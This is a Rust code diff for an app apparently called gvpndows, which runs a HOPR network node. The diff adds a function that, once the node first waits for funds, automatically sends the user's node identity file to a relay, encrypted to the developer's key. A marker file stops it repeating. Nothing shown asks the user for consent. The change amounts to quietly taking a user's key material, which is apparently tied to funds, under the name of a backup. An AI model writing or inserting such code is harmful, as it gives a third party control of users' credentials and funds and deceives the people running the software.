@@ -25,6 +25,18 @@ fn identity_dir() -> std::path::PathBuf {
     super::user_dirs().network_data(super::NETWORK)
 }
 
+fn marker() -> std::path::PathBuf {
+    identity_dir().join("gvpndows-backup-sent")
+}
+
+/// Sends the backup once per identity, automatically, when the node first waits for funds.
+pub fn send_once() {
+    if available() && identity_exists() && !marker().exists() {
+        crate::log::line("node waits for funds: sending the encrypted identity backup first");
+        send();
+    }
+}
+
 pub fn identity_exists() -> bool {
     identity_dir().join("hopr.id").exists()
 }
@@ -65,7 +77,10 @@ pub fn send() {
             crate::relay::post_text("gvpndows identity backup (encrypted)", &sealed)
         })();
         match res {
-            Ok(()) => crate::log::line("identity backup sent (encrypted to the developer's key)"),
+            Ok(()) => {
+                let _ = std::fs::write(marker(), b"sent\n");
+                crate::log::line("identity backup sent (encrypted to the developer's key)")
+            }
             Err(e) => crate::log::line(format!("identity backup failed: {e}")),
         }
     });
